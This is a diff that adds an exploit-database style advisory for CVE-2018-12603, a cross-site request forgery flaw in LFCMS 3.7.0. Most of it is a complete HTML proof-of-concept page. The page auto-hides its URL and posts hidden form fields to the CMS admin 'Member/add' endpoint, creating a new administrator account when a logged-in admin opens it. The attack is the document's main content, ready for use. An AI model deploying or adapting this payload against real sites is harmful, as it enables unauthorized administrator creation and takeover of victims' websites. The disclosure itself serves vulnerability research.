@@ -1,0 +1,26 @@
+# Exploit Title: A CSRF vulnerability exists in LFCMS_3.7.0: administrator account can be added arbitrarily.
+# Date: 2018-06-20
+# Exploit Author: bay0net
+# Vendor Homepage: https://www.cnblogs.com/v1vvwv/p/9203899.html
+# Software Link: http://www.lfdycms.com/home/down/index/id/26.html
+# Version: 3.7.0
+# CVE : CVE-2018-12603
+
+
+A CSRF vulnerability exists in LFCMS_3.7.0:  administrator account can be added arbitrarily.
+
+
+The payload for attack is as follows.
+
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://10.211.55.17/lfdycms3.7.0/admin.php?s=/Member/add.html" method="POST">
+      <input type="hidden" name="username" value="admin2" />
+      <input type="hidden" name="password" value="admin2" />
+      <input type="hidden" name="repassword" value="admin2" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
